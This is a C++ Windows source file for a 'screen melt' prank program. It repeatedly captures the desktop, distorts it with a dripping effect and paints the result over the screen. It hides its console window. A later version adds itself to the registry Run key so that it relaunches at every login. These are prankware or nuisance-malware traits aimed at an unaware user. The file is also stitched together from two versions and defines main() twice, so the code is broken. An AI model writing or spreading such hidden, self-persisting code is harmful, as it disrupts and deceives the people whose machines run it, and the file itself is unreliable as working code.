#include <windows.h>
#include <vector>
#include <algorithm>
#include <cstdlib>
#include <ctime>
#include <string>

template<typename T>
const T& clamp(const T& value, const T& low, const T& high) {
    return (value < low) ? low : (high < value) ? high : value;
}

const int UPDATE_DELAY_MS = 50;

void CaptureScreen(std::vector<COLORREF>& pixels, int& width, int& height) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    width = GetSystemMetrics(SM_CXSCREEN);
    height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bmi = { 0 };
    bmi.biSize = sizeof(BITMAPINFOHEADER);
    bmi.biWidth = width;
    bmi.biHeight = -height;
    bmi.biPlanes = 1;
    bmi.biBitCount = 32;
    bmi.biCompression = BI_RGB;

    pixels.resize(width * height);
    GetDIBits(hdcMem, hBitmap, 0, height, &pixels[0], (BITMAPINFO*)&bmi, DIB_RGB_COLORS);

    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void MeltEffect(std::vector<COLORREF>& pixels, int width, int height) {
    std::vector<COLORREF> temp(pixels);
    for (int y = height - 2; y >= 0; --y) {
        for (int x = 0; x < width; ++x) {
            int offset = rand() % 5 - 2;
            int newX = clamp(x + offset, 0, width - 1);
            pixels[(y + 1) * width + x] = temp[y * width + newX];
        }
    }

    for (int i = 0; i < 10; ++i) {
        int dripX = rand() % width;
        int dripLength = 10 + rand() % 50;
        for (int y = 0; y < height - 1 && y < dripLength; ++y) {
            if (y + 1 < height) {
                pixels[(y + 1) * width + dripX] = pixels[y * width + dripX];
            }
        }
    }
}

void RenderToScreen(const std::vector<COLORREF>& pixels, int width, int height) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);

    BITMAPINFOHEADER bmi = { 0 };
    bmi.biSize = sizeof(BITMAPINFOHEADER);
    bmi.biWidth = width;
    bmi.biHeight = -height;
    bmi.biPlanes = 1;
    bmi.biBitCount = 32;
    bmi.biCompression = BI_RGB;

    SetDIBits(hdcMem, hBitmap, 0, height, &pixels[0], (BITMAPINFO*)&bmi, DIB_RGB_COLORS);
    BitBlt(hdcScreen, 0, 0, width, height, hdcMem, 0, 0, SRCCOPY);

    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

int main() {
    srand(static_cast<unsigned>(time(nullptr)));
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);

    int width, height;
    std::vector<COLORREF> pixels;

    while (!(GetAsyncKeyState(VK_ESCAPE) & 0x8000)) {
        CaptureScreen(pixels, width, height);
        MeltEffect(pixels, width, height);
        RenderToScreen(pixels, width, height);
        Sleep(UPDATE_DELAY_MS);
    }

    CaptureScreen(pixels, width, height);
    RenderToScreen(pixels, width, height);

    return 0;
}

void AddToStartup() {
    HKEY hKey;
    const char* appName = "ScreenMeltEffect";
    std::string exePath;

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    exePath = path;

    if (RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_WRITE,
        &hKey
    ) == ERROR_SUCCESS) {
        RegSetValueExA(
            hKey,
            appName,
            0,
            REG_SZ,
            (const BYTE*)exePath.c_str(),
            exePath.size() + 1
        );
        RegCloseKey(hKey);
    }
}

int main() {
    srand(static_cast<unsigned>(time(nullptr)));
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);

    AddToStartup();

    int width, height;
    std::vector<COLORREF> pixels;

    while (!(GetAsyncKeyState(VK_ESCAPE) & 0x8000)) {
        CaptureScreen(pixels, width, height);
        MeltEffect(pixels, width, height);
        RenderToScreen(pixels, width, height);
        Sleep(UPDATE_DELAY_MS);
    }

    CaptureScreen(pixels, width, height);
    RenderToScreen(pixels, width, height);

    return 0;
}
